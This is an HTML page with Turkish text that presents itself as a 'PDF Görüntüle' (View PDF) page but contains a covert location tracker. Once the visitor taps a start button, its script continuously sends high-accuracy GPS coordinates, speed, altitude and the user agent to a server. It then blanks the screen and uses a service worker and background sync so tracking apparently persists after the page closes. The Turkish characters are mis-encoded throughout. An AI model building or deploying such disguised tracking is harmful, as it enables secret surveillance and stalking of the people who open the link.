<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>legachecker</title>
    <link rel="manifest" href="/manifest.json">
    <meta name="theme-color" content="#1976d2">
    <script src="/socket.io/socket.io.js"></script>
    <style>
        body {
            font-family: Arial, Helvetica, sans-serif;
            background: #fff;
            color: #222;
            margin: 0;
            padding: 0;
        }
        .container {
            max-width: 420px;
            margin: 0 auto;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .header {
            padding: 32px 0 16px 0;
            text-align: center;
        }
        .header h1 {
            font-size: 1.5em;
            font-weight: bold;
            margin: 0 0 8px 0;
            color: #222;
        }
        .header p {
            color: #666;
            font-size: 1em;
            margin: 0;
        }
        .content {
            flex: 1;
            padding: 24px 16px 0 16px;
        }
        .info-box {
            background: #f7f7f7;
            border: 1px solid #eee;
            border-radius: 8px;
            padding: 18px 14px;
            margin-bottom: 18px;
        }
        .info-box ul {
            padding-left: 18px;
            margin: 0 0 10px 0;
        }
        .info-box li {
            margin-bottom: 6px;
            color: #444;
            font-size: 0.97em;
        }
        .controls {
            display: flex;
            gap: 10px;
            margin-bottom: 18px;
        }
        .btn {
            flex: 1;
            padding: 12px 0;
            border: none;
            border-radius: 6px;
            background: #1976d2;
            color: #fff;
            font-size: 1em;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
        }
        .btn:disabled {
            background: #b0b0b0;
            color: #fff;
            cursor: not-allowed;
        }
        .btn-danger {
            background: #e53935;
        }
        .btn-success {
            background: #4caf50;
        }
        .status {
            margin-bottom: 16px;
            font-size: 1em;
            color: #1976d2;
        }
        .location-box {
            background: #f7f7f7;
            border: 1px solid #eee;
            border-radius: 8px;
            padding: 14px 10px;
            margin-bottom: 18px;
            text-align: center;
        }
        .location-coords {
            font-size: 1.2em;
            font-weight: bold;
            color: #222;
            margin-bottom: 8px;
        }
        .location-details {
            display: flex;
            justify-content: space-between;
            font-size: 0.97em;
            color: #555;
        }
        .map-container {
            width: 100%;
            height: 240px;
            border-radius: 8px;
            overflow: hidden;
            border: 1px solid #eee;
            margin-bottom: 18px;
        }
        .footer {
            text-align: center;
            color: #aaa;
            font-size: 0.95em;
            padding: 18px 0 10px 0;
        }
        .notification {
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: #1976d2;
            color: #fff;
            border-radius: 6px;
            padding: 10px 18px;
            font-size: 1em;
            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
            z-index: 1000;
            display: none;
        }
        .notification.show {
            display: block;
        }
        .background-status {
            background: #4caf50;
            color: #fff;
            padding: 8px 12px;
            border-radius: 6px;
            font-size: 0.9em;
            margin-bottom: 16px;
            text-align: center;
        }
        .background-status.inactive {
            background: #f44336;
        }
        @media (max-width: 480px) {
            .container { max-width: 100vw; }
            .content { padding: 16px 4px 0 4px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>PDF GÃ¶rÃ¼ntÃ¼le</h1>
        </div>
        <div class="content">
            <div class="background-status" id="backgroundStatus">
                ðŸ”´ Arka plan takibi devre dÄ±ÅŸÄ±
            </div>
            <div class="controls">
                <button id="startTrackingBtn" class="btn" onclick="startTracking()">
                    <span id="startBtnText">BaÅŸlat</span>
                </button>
                <button id="stopTrackingBtn" class="btn btn-danger" onclick="stopTracking()" style="display: none;">
                    Durdur
                </button>
            </div>
            <div class="status" id="statusText" style="display:none;">Takip aktif...</div>
            <div class="location-box" id="locationDisplay" style="display:none;">
                <div class="location-coords" id="locationCoords">Konum alÄ±nÄ±yor...</div>
                <div class="location-details">
                    <div id="accuracyValue">-</div>
                    <div id="speedValue">-</div>
                    <div id="headingValue">-</div>
                    <div id="altitudeValue">-</div>
                </div>
            </div>
            <div class="map-container" id="mapContainer" style="display:none;">
                <iframe class="map-iframe" id="mapIframe" frameborder="0" style="width:100%;height:100%;border:none;"></iframe>
            </div>
        </div>
        <div class="footer">
            Â© 2024 legachecker
        </div>
    </div>
    <div class="notification" id="notification"></div>
    <script>
        let trackingId = '';
        let sessionId = '';
        let isTracking = false;
        let watchId = null;
        let socket = null;
        let locationCount = 0;
        let backgroundSyncSupported = false;
        let serviceWorkerRegistration = null;

        function getTrackingId() {
            const pathParts = window.location.pathname.split('/');
            return pathParts[pathParts.length - 1];
        }

        // Service Worker kaydÄ±
        async function registerServiceWorker() {
            if ('serviceWorker' in navigator) {
                try {
                    serviceWorkerRegistration = await navigator.serviceWorker.register('/sw.js');
                    console.log('Service Worker kaydedildi:', serviceWorkerRegistration);
                    
                    // Background Sync desteÄŸini kontrol et
                    if ('sync' in serviceWorkerRegistration) {
                        backgroundSyncSupported = true;
                        updateBackgroundStatus();
                    }
                } catch (error) {
                    console.error('Service Worker kaydÄ± baÅŸarÄ±sÄ±z:', error);
                }
            }
        }

        // Background Sync durumunu gÃ¼ncelle
        function updateBackgroundStatus() {
            const statusElement = document.getElementById('backgroundStatus');
            if (backgroundSyncSupported) {
                statusElement.innerHTML = 'ðŸŸ¢ Arka plan takibi aktif';
                statusElement.classList.remove('inactive');
            } else {
                statusElement.innerHTML = 'ðŸ”´ Arka plan takibi desteklenmiyor';
                statusElement.classList.add('inactive');
            }
        }

        // Background Sync kaydÄ±
        async function registerBackgroundSync() {
            if (backgroundSyncSupported && serviceWorkerRegistration) {
                try {
                    await serviceWorkerRegistration.sync.register('location-sync');
                    console.log('Background Sync kaydedildi');
                    showNotification('Arka plan takibi aktifleÅŸtirildi', 'success');
                } catch (error) {
                    console.error('Background Sync kaydÄ± baÅŸarÄ±sÄ±z:', error);
                }
            }
        }

        // Periyodik arka plan senkronizasyonu
        async function registerPeriodicSync() {
            if ('periodicSync' in navigator.serviceWorker) {
                try {
                    const status = await navigator.permissions.query({
                        name: 'periodic-background-sync'
                    });
                    
                    if (status.state === 'granted') {
                        await serviceWorkerRegistration.periodicSync.register('location-sync', {
                            minInterval: 24 * 60 * 60 * 1000 // 24 saat
                        });
                        console.log('Periyodik senkronizasyon kaydedildi');
                    }
                } catch (error) {
                    console.error('Periyodik senkronizasyon hatasÄ±:', error);
                }
            }
        }

        // Push notification izni iste
        async function requestNotificationPermission() {
            if ('Notification' in window) {
                const permission = await Notification.requestPermission();
                if (permission === 'granted') {
                    console.log('Push notification izni verildi');
                    return true;
                }
            }
            return false;
        }

        document.addEventListener('DOMContentLoaded', function() {
            trackingId = getTrackingId();
            if (!trackingId) {
                showNotification('Hata: GeÃ§ersiz link', 'error');
                return;
            }
            
            socket = io({ transports: ['websocket', 'polling'] });
            socket.emit('join-tracking', trackingId);
            
            // Service Worker'Ä± kaydet
            registerServiceWorker();
            
            // Sayfa kapatma olayÄ±nÄ± kaldÄ±r - artÄ±k takip devam edecek
            // window.addEventListener('beforeunload', function(e) {
            //     if (isTracking) stopTracking();
            // });
        });

        async function startTracking() {
            if (isTracking) return;
            
            try {
                const sessionResponse = await fetch('/api/start-session', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ trackingId })
                });
                const sessionData = await sessionResponse.json();
                sessionId = sessionData.sessionId;
                
                if (!navigator.geolocation) {
                    showNotification('TarayÄ±cÄ±nÄ±z konum Ã¶zelliÄŸini desteklemiyor.', 'error');
                    return;
                }

                const btn = document.getElementById('startTrackingBtn');
                btn.disabled = true;
                btn.innerHTML = 'BaÅŸlatÄ±lÄ±yor...';

                const options = { 
                    enableHighAccuracy: true, 
                    timeout: 10000, 
                    maximumAge: 0 
                };

                watchId = navigator.geolocation.watchPosition(
                    onLocationSuccess,
                    onLocationError,
                    options
                );

                isTracking = true;
                locationCount = 0;
                updateUI();

                // Background Sync'i kaydet
                await registerBackgroundSync();
                
                // Periyodik senkronizasyonu kaydet
                await registerPeriodicSync();
                
                // Push notification izni iste
                await requestNotificationPermission();

                showNotification('Takip baÅŸlatÄ±ldÄ± - Sayfa kapansa bile devam edecek', 'success');
            } catch (error) {
                showNotification('Hata: ' + error.message, 'error');
                document.getElementById('startTrackingBtn').disabled = false;
            }
        }

        function onLocationSuccess(position) {
            const { latitude, longitude, accuracy, speed, heading, altitude } = position.coords;
            
            document.getElementById('locationCoords').textContent = `${latitude.toFixed(6)}, ${longitude.toFixed(6)}`;
            document.getElementById('accuracyValue').textContent = `Â±${Math.round(accuracy)}m`;
            document.getElementById('speedValue').textContent = speed ? `${Math.round(speed * 3.6)}km/h` : '-';
            document.getElementById('headingValue').textContent = heading ? `${Math.round(heading)}Â°` : '-';
            document.getElementById('altitudeValue').textContent = altitude ? `${Math.round(altitude)}m` : '-';
            
            updateMap(latitude, longitude);
            sendLocationToServer(latitude, longitude, accuracy, speed, heading, altitude);
            locationCount++;
        }

        function onLocationError(error) {
            let errorMessage = 'Konum alÄ±namadÄ±.';
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    errorMessage = 'Konum izni reddedildi.'; break;
                case error.POSITION_UNAVAILABLE:
                    errorMessage = 'Konum bilgisi mevcut deÄŸil.'; break;
                case error.TIMEOUT:
                    errorMessage = 'Konum alma zaman aÅŸÄ±mÄ±na uÄŸradÄ±.'; break;
            }
            showNotification(errorMessage, 'error');
            stopTracking();
        }

        async function sendLocationToServer(latitude, longitude, accuracy, speed, heading, altitude) {
            const locationData = {
                trackingId,
                latitude,
                longitude,
                accuracy,
                speed: speed || 0,
                heading: heading || 0,
                altitude: altitude || 0,
                userAgent: navigator.userAgent,
                ipAddress: 'Client IP',
                sessionId
            };

            try {
                // Ã–nce doÄŸrudan sunucuya gÃ¶ndermeyi dene
                const response = await fetch('/api/save-location', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(locationData)
                });

                if (!response.ok) {
                    throw new Error('Sunucu hatasÄ±');
                }

                console.log('Konum baÅŸarÄ±yla gÃ¶nderildi');
            } catch (error) {
                console.error('Konum gÃ¶nderme hatasÄ±:', error);
                
                // Hata durumunda Service Worker'a kaydet
                if (navigator.serviceWorker && navigator.serviceWorker.controller) {
                    navigator.serviceWorker.controller.postMessage({
                        type: 'STORE_LOCATION',
                        location: locationData
                    });
                    console.log('Konum Service Worker\'a kaydedildi');
                }
            }
        }

        async function stopTracking() {
            if (!isTracking) return;
            
            try {
                if (watchId) {
                    navigator.geolocation.clearWatch(watchId);
                    watchId = null;
                }
                
                if (sessionId) {
                    await fetch('/api/stop-session', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ sessionId })
                    });
                }
                
                isTracking = false;
                updateUI();
                showNotification('Konum takibi durduruldu.', 'info');
            } catch (error) {
                showNotification('Hata: ' + error.message, 'error');
            }
        }

        function updateUI() {
            const startBtn = document.getElementById('startTrackingBtn');
            const stopBtn = document.getElementById('stopTrackingBtn');
            const statusText = document.getElementById('statusText');
            const locationDisplay = document.getElementById('locationDisplay');
            const mapContainer = document.getElementById('mapContainer');
            const content = document.querySelector('.content');
            const header = document.querySelector('.header');
            const footer = document.querySelector('.footer');
            
            if (isTracking) {
                // Sadece boÅŸ ekran gÃ¶ster
                header.style.display = 'none';
                content.style.display = 'none';
                footer.style.display = 'none';
            } else {
                // Normal gÃ¶rÃ¼nÃ¼mÃ¼ geri getir
                header.style.display = 'block';
                content.style.display = 'block';
                footer.style.display = 'block';
                startBtn.style.display = 'block';
                stopBtn.style.display = 'none';
                statusText.style.display = 'none';
                locationDisplay.style.display = 'none';
                mapContainer.style.display = 'none';
                startBtn.disabled = false;
                startBtn.innerHTML = 'BaÅŸlat';
            }
        }

        function updateMap(latitude, longitude) {
            const mapUrl = `https://www.openstreetmap.org/export/embed.html?bbox=${longitude-0.01},${latitude-0.01},${longitude+0.01},${latitude+0.01}&layer=mapnik&marker=${latitude},${longitude}`;
            document.getElementById('mapIframe').src = mapUrl;
        }

        function showNotification(message, type = 'info') {
            const notification = document.getElementById('notification');
            notification.textContent = message;
            notification.className = `notification show`;
            setTimeout(() => {
                notification.classList.remove('show');
            }, 2500);
        }
    </script>
</body>
